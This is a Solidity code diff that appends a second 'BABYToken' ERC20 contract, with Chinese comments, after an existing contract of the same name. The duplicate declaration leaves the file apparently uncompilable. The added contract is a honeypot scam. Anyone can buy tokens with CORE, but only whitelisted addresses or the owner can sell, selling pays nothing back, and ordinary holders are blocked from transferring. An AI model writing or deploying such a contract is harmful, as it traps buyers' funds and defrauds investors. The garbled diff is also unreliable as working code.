@@ -58,4 +58,45 @@ contract BABYToken is ERC20Capped, Ownable {
 
         super._transfer(sender, recipient, amount);
     }
+}// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract BABYToken is ERC20, Ownable {
+    mapping(address => bool) public whitelist; // 白名单
+
+    constructor(uint256 initialSupply) ERC20("BABY", "BABY") {
+        _mint(msg.sender, initialSupply);
+    }
+
+    // 设置白名单权限
+    function setWhitelist(address account, bool status) external onlyOwner {
+        whitelist[account] = status;
+    }
+
+    // 购买代币（无限制购买）
+    function buyTokens() external payable {
+        require(msg.value > 0, "Must send CORE to buy tokens");
+        
+        uint256 amount = msg.value * 100; // 价格将基于首次流动性配对比例调整
+        require(amount <= balanceOf(owner()), "Not enough tokens available");
+
+        _transfer(owner(), msg.sender, amount);
+    }
+
+    // 卖出代币（仅限白名单和合约拥有者）
+    function sellTokens(uint256 amount) external {
+        require(whitelist[msg.sender] || msg.sender == owner(), "Not authorized to sell tokens");
+        _transfer(msg.sender, owner(), amount);
+    }
+
+    // 覆盖 transfer 函数，禁止非白名单用户转让
+    function _transfer(address sender, address recipient, uint256 amount) internal override {
+        if (sender != owner() && recipient != owner() && !whitelist[sender]) {
+            revert("Users cannot transfer tokens");
+        }
+        super._transfer(sender, recipient, amount);
+    }
 }
